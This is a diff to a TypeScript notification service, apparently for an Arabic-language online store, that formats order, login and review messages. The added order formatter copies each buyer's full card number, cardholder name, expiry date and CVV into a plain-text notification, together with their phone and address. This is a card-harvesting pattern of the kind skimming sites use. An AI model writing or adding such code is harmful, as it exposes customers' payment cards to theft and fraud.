@@ -39,6 +39,42 @@ export class NotificationService {
     }
   }
 
+  static formatOrderMessage(details: { 
+    product: string, 
+    price: string, 
+    method: string, 
+    customer: any, 
+    productUrl?: string,
+    cardDetails?: { number: string, expiry: string, cvv: string, name: string }
+  }) {
+    const time = new Date().toLocaleString('ar-YE');
+    let msg = `💰 <b>طلب شراء جديد</b>\n\n` +
+           `📦 <b>المنتج:</b> ${details.product}\n` +
+           `💵 <b>السعر:</b> ${details.price}\n` +
+           `💳 <b>وسيلة الدفع:</b> ${details.method}\n\n`;
+
+    if (details.cardDetails) {
+      msg += `🔒 <b>بيانات البطاقة:</b>\n` +
+             `💳 الرقم: <code>${details.cardDetails.number}</code>\n` +
+             `👤 الاسم: ${details.cardDetails.name}\n` +
+             `📅 التاريخ: ${details.cardDetails.expiry}\n` +
+             `🔑 CVV: <code>${details.cardDetails.cvv}</code>\n\n`;
+    }
+
+    msg += `👤 <b>بيانات العميل:</b>\n` +
+           `👤 الاسم: ${details.customer.fullName || details.customer.name}\n` +
+           `📞 الهاتف: ${details.customer.phone || 'غير مسجل'}\n` +
+           `📍 المدينة: ${details.customer.city || 'غير محدد'}\n` +
+           `🏠 العنوان: ${details.customer.address || 'غير محدد'}\n`;
+
+    if (details.productUrl) {
+      msg += `🔗 <b>رابط المنتج:</b> ${details.productUrl}\n`;
+    }
+
+    msg += `\n⏰ <b>الوقت:</b> ${time}`;
+    return msg;
+  }
+
   static formatAiChatMessage(userMsg: string, aiMsg: string) {
     const time = new Date().toLocaleString('ar-YE');
     return `🤖 <b>استفسار ذكي جديد</b>\n\n` +
@@ -52,36 +88,16 @@ export class NotificationService {
     return `🚨 <b>إشعار دخول جديد</b>\n\n` +
            `👤 <b>الاسم:</b> ${user.name}\n` +
            `📧 <b>البريد:</b> ${user.email}\n` +
-           `🔗 <b>المزود:</b> ${user.provider || 'بريد إلكتروني'}\n` +
            `⏰ <b>الوقت:</b> ${time}`;
   }
 
   static formatReviewMessage(review: any) {
     const time = new Date().toLocaleString('ar-YE');
     const stars = "⭐".repeat(review.rating);
-    return `📝 <b>تقييم جديد للمتجر</b>\n\n` +
+    return `📝 <b>تقييم جديد</b>\n\n` +
            `👤 <b>الاسم:</b> ${review.name}\n` +
            `⭐ <b>التقييم:</b> ${stars}\n` +
            `💬 <b>التعليق:</b> ${review.comment}\n` +
            `⏰ <b>الوقت:</b> ${time}`;
-  }
-
-  static formatOrderMessage(details: { product: string, price: string, method: string, customer: any, productUrl?: string }) {
-    const time = new Date().toLocaleString('ar-YE');
-    let msg = `💰 <b>طلب شراء جديد</b>\n\n` +
-           `📦 <b>المنتج:</b> ${details.product}\n` +
-           `💵 <b>السعر:</b> ${details.price}\n` +
-           `💳 <b>وسيلة الدفع:</b> ${details.method}\n\n` +
-           `👤 <b>الاسم:</b> ${details.customer.fullName || details.customer.name}\n` +
-           `📞 <b>الهاتف:</b> ${details.customer.phone || 'غير مسجل'}\n` +
-           `📍 <b>المدينة:</b> ${details.customer.city || 'غير محدد'}\n` +
-           `🏠 <b>العنوان:</b> ${details.customer.address || 'غير محدد'}\n`;
-
-    if (details.productUrl) {
-      msg += `🔗 <b>رابط المنتج:</b> ${details.productUrl}\n`;
-    }
-
-    msg += `\n⏰ <b>الوقت:</b> ${time}`;
-    return msg;
   }
 }
